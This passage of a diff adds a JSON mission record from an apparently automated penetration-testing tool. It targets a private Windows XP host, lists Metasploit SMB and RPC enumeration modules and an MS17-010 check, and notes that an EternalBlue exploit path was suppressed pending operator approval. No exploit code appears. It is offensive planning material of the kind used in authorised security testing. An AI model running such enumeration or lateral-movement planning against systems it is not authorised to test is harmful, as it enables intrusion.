+      "at": "2026-07-22T05:15:58.366538+00:00",
+      "kind": "stage_active",
+      "message": "Entered stage Alternate lateral (non-EB)"
+    },
+    {
+      "at": "2026-07-22T05:15:58.368626+00:00",
+      "kind": "lateral_queued",
+      "message": "24 lateral technique(s)"
+    },
+    {
+      "at": "2026-07-22T05:15:58.371379+00:00",
+      "kind": "stage_active",
+      "message": "Entered stage Mission debrief"
+    },
+    {
+      "at": "2026-07-22T05:15:58.374381+00:00",
+      "kind": "mission_completed",
+      "message": "Mission debrief compiled"
+    }
+  ],
+  "research_queue": [
+    {
+      "target": "192.168.86.129",
+      "port": 137,
+      "service": "netbios-ns",
+      "product": "",
+      "title": "Unknown surface 192.168.86.129:137/netbios-ns",
+      "reason": "No catalog module/profile matched this service. Zero-day readiness: classify class, safe-probe only, analyst review.",
+      "recommended_class_hints": [
+        "generic_exposure"
+      ]
+    }
+  ],
+  "proofs": [],
+  "attack_graph": {
+    "nodes": [
+      {
+        "id": "zone:edge",
+        "kind": "zone",
+        "label": "Authorised edge / Ethernet scope",
+        "status": "active"
+      },
+      {
+        "id": "host:192.168.86.129",
+        "kind": "host",
+        "label": "192.168.86.129",
+        "ip": "192.168.86.129",
+        "status": "discovered",
+        "services": [
+          "svc:192.168.86.129:135",
+          "svc:192.168.86.129:139",
+          "svc:192.168.86.129:445",
+          "svc:192.168.86.129:137"
+        ]
+      },
+      {
+        "id": "svc:192.168.86.129:135",
+        "kind": "service",
+        "label": "msrpc/135 (Microsoft Windows RPC )",
+        "host": "192.168.86.129",
+        "port": 135,
+        "service": "msrpc",
+        "product": "Microsoft Windows RPC",
+        "version": "",
+        "cves": [],
+        "status": "exposed"
+      },
+      {
+        "id": "mod:msf_rpc_dump:192.168.86.129:135",
+        "kind": "module",
+        "label": "Metasploit RPC endpoint mapper",
+        "catalog_key": "msf_rpc_dump",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "svc:192.168.86.129:139",
+        "kind": "service",
+        "label": "smb/139 (Microsoft Windows netbios-ssn )",
+        "host": "192.168.86.129",
+        "port": 139,
+        "service": "smb",
+        "product": "Microsoft Windows netbios-ssn",
+        "version": "",
+        "cves": [],
+        "status": "exposed"
+      },
+      {
+        "id": "mod:msf_smb_version:192.168.86.129:139",
+        "kind": "module",
+        "label": "Metasploit SMB version scanner",
+        "catalog_key": "msf_smb_version",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_unsigned:192.168.86.129:139",
+        "kind": "module",
+        "label": "Metasploit SMB signing scanner",
+        "catalog_key": "msf_smb_unsigned",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_enumshares:192.168.86.129:139",
+        "kind": "module",
+        "label": "Metasploit SMB share enumerator",
+        "catalog_key": "msf_smb_enumshares",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_enumusers:192.168.86.129:139",
+        "kind": "module",
+        "label": "Metasploit SMB user enumerator",
+        "catalog_key": "msf_smb_enumusers",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "svc:192.168.86.129:445",
+        "kind": "service",
+        "label": "smb/445 (Microsoft Windows XP microsoft-ds )",
+        "host": "192.168.86.129",
+        "port": 445,
+        "service": "smb",
+        "product": "Microsoft Windows XP microsoft-ds",
+        "version": "",
+        "cves": [],
+        "status": "exposed"
+      },
+      {
+        "id": "mod:msf_smb_version:192.168.86.129:445",
+        "kind": "module",
+        "label": "Metasploit SMB version scanner",
+        "catalog_key": "msf_smb_version",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_ms17_010_check:192.168.86.129:445",
+        "kind": "module",
+        "label": "MS17-010 EternalBlue check (safe)",
+        "catalog_key": "msf_smb_ms17_010_check",
+        "module_type": "auxiliary",
+        "risk": "high",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_unsigned:192.168.86.129:445",
+        "kind": "module",
+        "label": "Metasploit SMB signing scanner",
+        "catalog_key": "msf_smb_unsigned",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_enumshares:192.168.86.129:445",
+        "kind": "module",
+        "label": "Metasploit SMB share enumerator",
+        "catalog_key": "msf_smb_enumshares",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "mod:msf_smb_enumusers:192.168.86.129:445",
+        "kind": "module",
+        "label": "Metasploit SMB user enumerator",
+        "catalog_key": "msf_smb_enumusers",
+        "module_type": "auxiliary",
+        "risk": "medium",
+        "status": "proposed"
+      },
+      {
+        "id": "svc:192.168.86.129:137",
+        "kind": "service",
+        "label": "netbios-ns/137",
+        "host": "192.168.86.129",
+        "port": 137,
+        "service": "netbios-ns",
+        "product": "",
+        "version": "",
+        "cves": [],
+        "status": "exposed"
+      }
+    ],
+    "edges": [
+      {
+        "id": "e:zone:edge->host:192.168.86.129",
+        "source": "zone:edge",
+        "target": "host:192.168.86.129",
+        "kind": "discovery",
+        "label": "in scope"
+      },
+      {
+        "id": "e:host:192.168.86.129->svc:192.168.86.129:135",
+        "source": "host:192.168.86.129",
+        "target": "svc:192.168.86.129:135",
+        "kind": "exposes",
+        "label": "135"
+      },
+      {
+        "id": "e:svc:192.168.86.129:135->mod:msf_rpc_dump:192.168.86.129:135",
+        "source": "svc:192.168.86.129:135",
+        "target": "mod:msf_rpc_dump:192.168.86.129:135",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:host:192.168.86.129->svc:192.168.86.129:139",
+        "source": "host:192.168.86.129",
+        "target": "svc:192.168.86.129:139",
+        "kind": "exposes",
+        "label": "139"
+      },
+      {
+        "id": "e:svc:192.168.86.129:139->mod:msf_smb_version:192.168.86.129:139",
+        "source": "svc:192.168.86.129:139",
+        "target": "mod:msf_smb_version:192.168.86.129:139",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:139->mod:msf_smb_unsigned:192.168.86.129:139",
+        "source": "svc:192.168.86.129:139",
+        "target": "mod:msf_smb_unsigned:192.168.86.129:139",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:139->mod:msf_smb_enumshares:192.168.86.129:139",
+        "source": "svc:192.168.86.129:139",
+        "target": "mod:msf_smb_enumshares:192.168.86.129:139",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:139->mod:msf_smb_enumusers:192.168.86.129:139",
+        "source": "svc:192.168.86.129:139",
+        "target": "mod:msf_smb_enumusers:192.168.86.129:139",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:host:192.168.86.129->svc:192.168.86.129:445",
+        "source": "host:192.168.86.129",
+        "target": "svc:192.168.86.129:445",
+        "kind": "exposes",
+        "label": "445"
+      },
+      {
+        "id": "e:svc:192.168.86.129:445->mod:msf_smb_version:192.168.86.129:445",
+        "source": "svc:192.168.86.129:445",
+        "target": "mod:msf_smb_version:192.168.86.129:445",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:445->mod:msf_smb_ms17_010_check:192.168.86.129:445",
+        "source": "svc:192.168.86.129:445",
+        "target": "mod:msf_smb_ms17_010_check:192.168.86.129:445",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:445->mod:msf_smb_unsigned:192.168.86.129:445",
+        "source": "svc:192.168.86.129:445",
+        "target": "mod:msf_smb_unsigned:192.168.86.129:445",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:445->mod:msf_smb_enumshares:192.168.86.129:445",
+        "source": "svc:192.168.86.129:445",
+        "target": "mod:msf_smb_enumshares:192.168.86.129:445",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:svc:192.168.86.129:445->mod:msf_smb_enumusers:192.168.86.129:445",
+        "source": "svc:192.168.86.129:445",
+        "target": "mod:msf_smb_enumusers:192.168.86.129:445",
+        "kind": "catalog_match",
+        "label": "auxiliary"
+      },
+      {
+        "id": "e:host:192.168.86.129->svc:192.168.86.129:137",
+        "source": "host:192.168.86.129",
+        "target": "svc:192.168.86.129:137",
+        "kind": "exposes",
+        "label": "137"
+      }
+    ],
+    "stats": {
+      "hosts": 1,
+      "services": 4,
+      "catalog_matches": 6,
+      "hosts_with_catalog": 1
+    },
+    "matched_catalog_keys": [
+      "msf_rpc_dump",
+      "msf_smb_enumshares",
+      "msf_smb_enumusers",
+      "msf_smb_ms17_010_check",
+      "msf_smb_unsigned",
+      "msf_smb_version"
+    ]
+  },
+  "pending_approvals": [],
+  "debrief": {
+    "goal": "From authorised edge evidence, auto-validate safe exposures, branch when celebrity exploits are patched, unlock high-risk impact only with proof plan + operator approval, then expand via pivot.",
+    "goal_status": "partial",
+    "playbook_id": "edge_to_internal_proof",
+    "flags": [
+      "alternate_lateral_enabled",
+      "branch_ms17_suppressed",
+      "ms17_not_exploitable",
+      "research_queue_active",
+      "smb_present",
+      "unknown_surface_present"
+    ],
+    "branch_events": [
+      {
+        "branch_id": "ms17_patched_or_absent",
+        "message": "SMB present but MS17-010 not evidenced \u2014 exploit suppressed. Alternate lateral planning enabled (professional non-exploit outcome).",
+        "at": "2026-07-22T05:15:58.315039+00:00",
+        "set_flags": [
+          "alternate_lateral_enabled",
+          "branch_ms17_suppressed",
+          "ms17_not_exploitable"
+        ]
+      },
+      {
+        "branch_id": "unknown_surface",
+        "message": "Uncatalogued services entered zero-day readiness / research queue \u2014 safe probes only, no invented exploits.",
+        "at": "2026-07-22T05:15:58.330572+00:00",
+        "set_flags": [
+          "research_queue_active"
+        ]
+      }
+    ],
+    "proofs": [],
+    "confirmed_findings_count": 0,
+    "suppressed_or_failed": [],
+    "research_queue": [
+      {
+        "target": "192.168.86.129",
+        "port": 137,
+        "service": "netbios-ns",
+        "product": "",
+        "title": "Unknown surface 192.168.86.129:137/netbios-ns",
+        "reason": "No catalog module/profile matched this service. Zero-day readiness: classify class, safe-probe only, analyst review.",
+        "recommended_class_hints": [
+          "generic_exposure"
+        ]
+      }
+    ],
+    "action_summary": {
+      "total": 35,
+      "queued_auto": 10,
+      "approved": 0,
+      "awaiting_approval": 0,
+      "succeeded": 0,
+      "research": 1
+    },
+    "blue_team_timeline": [
+      {
+        "stage": "surface_lock",
+        "alert": "Ethernet segment scan / ARP-Nmap inventory observed",
+        "severity": "medium",
+        "response": "Logged \u2014 confirm authorised scope"
+      },
+      {
+        "stage": "safe_validation",
+        "alert": "Auxiliary service validation probes (SMB/HTTP checks)",
+        "severity": "medium",
+        "response": "Correlate with asset inventory"
+      },
+      {
+        "stage": "impact_gate",
+        "alert": "High-risk action approved by red operator",
+        "severity": "high",
+        "response": "Heighten monitoring; prepare isolation"
+      },
+      {
+        "stage": "pivot_expand",
+        "alert": "Internal VLAN scan via pivot path",
+        "severity": "high",
+        "response": "Isolate affected VLAN; hunt lateral"
+      }
+    ],
+    "attack_graph_stats": {
+      "hosts": 1,
+      "services": 4,
+      "catalog_matches": 6,
+      "hosts_with_catalog": 1
+    },
+    "professional_notes": [
+      "MS17-010/EternalBlue class path suppressed \u2014 target not evidenced as vulnerable. This is a correct automated outcome, not a tool failure.",
+      "Unknown surfaces entered research queue (zero-day readiness). No exploit modules were invented by the LLM or browser.",
+      "10 safe action(s) remained queued_auto at debrief \u2014 use Validate safe queue or wire live MSF callbacks for full evidence closure."
+    ],
+    "compiled_at": "2026-07-22T05:15:58.374342+00:00"
+  },
+  "parsed_results_snapshot": {
+    "web_inventory": [],
+    "os": "Unknown",
+    "hosts": [
+      {
+        "address": {
+          "primary": "192.168.86.129"
+        },
+        "os": {
+          "name": ""
+        },
+        "port_findings": [
+          {
+            "port": 135,
+            "protocol": "tcp",
+            "state": "open",
+            "service": "msrpc",
+            "product": "Microsoft Windows RPC",
+            "version": "",
+            "extrainfo": "",
+            "cpe": [
+              "cpe:/o:microsoft:windows"
+            ],
+            "scripts": []
+          },
+          {
+            "port": 139,
+            "protocol": "tcp",
+            "state": "open",
+            "service": "netbios-ssn",
+            "product": "Microsoft Windows netbios-ssn",
+            "version": "",
+            "extrainfo": "",
+            "cpe": [
+              "cpe:/o:microsoft:windows"
+            ],
+            "scripts": []
+          },
+          {
+            "port": 445,
+            "protocol": "tcp",
+            "state": "open",
+            "service": "microsoft-ds",
+            "product": "Microsoft Windows XP microsoft-ds",
+            "version": "",
+            "extrainfo": "",
+            "cpe": [
+              "cpe:/o:microsoft:windows_xp"
+            ],
+            "scripts": []
+          },
+          {
+            "port": 137,
+            "protocol": "udp",
+            "state": "open",
+            "service": "netbios-ns",
+            "product": "",
+            "version": "",
+            "extrainfo": "",
+            "cpe": [],
+            "scripts": []
+          }
+        ]
+      }
+    ],
+    "ports": [
+      {
+        "port": 135,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "msrpc",
+        "product": "Microsoft Windows RPC",
+        "version": "",
+        "extrainfo": ""
+      },
+      {
+        "port": 139,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "netbios-ssn",
+        "product": "Microsoft Windows netbios-ssn",
+        "version": "",
+        "extrainfo": ""
+      },
+      {
+        "port": 445,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "microsoft-ds",
+        "product": "Microsoft Windows XP microsoft-ds",
+        "version": "",
+        "extrainfo": ""
+      },
+      {
+        "port": 137,
+        "protocol": "udp",
+        "state": "open",
+        "service": "netbios-ns",
+        "product": "",
+        "version": "",
+        "extrainfo": ""
+      }
+    ],
+    "target_ip": "192.168.86.129"
+  },
+  "evidence": {
+    "host_count": 1,
+    "port_count": 4,
+    "services": [
+      "msrpc",
+      "netbios-ns",
+      "smb"
+    ]
+  }
+}
